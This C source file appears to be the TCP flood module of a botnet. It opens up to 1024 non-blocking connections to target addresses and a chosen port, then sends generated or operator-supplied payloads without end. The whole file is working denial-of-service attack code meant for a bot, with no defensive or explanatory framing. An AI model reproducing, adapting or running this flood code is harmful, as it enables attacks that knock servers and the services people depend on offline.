
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <time.h>

#include <netinet/in.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"

void flood_tcpsocket(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;

  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  u16 conns = flood_retrieve_u16(ctx, OPT_CONNS, 1024);
  if (conns > 1024) conns = 1024;

  struct connection_state {
    int fd;
    int state;
    uint32_t timeout;
    struct sockaddr_in addr;
  } states[conns];

  for (int i = 0; i < conns; i++) {
    struct connection_state *state = &states[i];
    state->fd = -1;
    state->state = 0;
    state->timeout = 0;

    state->addr.sin_family = AF_INET;
    state->addr.sin_addr.s_addr = ctx->targets[i % ctx->num_targs].address;
    state->addr.sin_port = htons(dport);
  }

  while (true) {
    fd_set write_set;
    struct timeval timeout;
    int fds = 0;
    socklen_t err = 0;
    int err_len = sizeof(int);

    for (int i = 0; i < conns; i++) {
      struct connection_state *conn = &states[i];

      switch (conn->state) {
        case 0: {
          if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            continue;
          }

          fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

          errno = 0;
          if (connect(conn->fd, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in)) !=
                  -1 ||
              errno != EINPROGRESS) {
            close(conn->fd);
            conn->timeout = 0;
            continue;
          }

          conn->state = 1;
          conn->timeout = time(NULL);
          break;
        }
        case 1: {
          FD_ZERO(&write_set);
          FD_SET(conn->fd, &write_set);

          timeout.tv_usec = 10;
          timeout.tv_sec = 0;

          fds = select(conn->fd + 1, NULL, &write_set, NULL, &timeout);
          if (fds == 1) {
            getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if (err) {
              close(conn->fd);
              conn->state = 0;
              conn->timeout = 0;
              continue;
            }

            conn->state = 2;
            continue;
          } else if (fds == -1) {
            close(conn->fd);
            conn->state = 0;
            conn->timeout = 0;
          }

          if (conn->timeout + 5 < time(NULL)) {
            close(conn->fd);
            conn->state = 0;
            conn->timeout = 0;
          }

        } break;
        case 2: {
          uint8_t *buffer =
              flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);

          if (send(conn->fd, buffer, buffer_len, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
            close(conn->fd);
            conn->state = 0;
            conn->timeout = 0;
          }

          FREE_NULL(buffer);
        } break;
      }
    }
  }
}
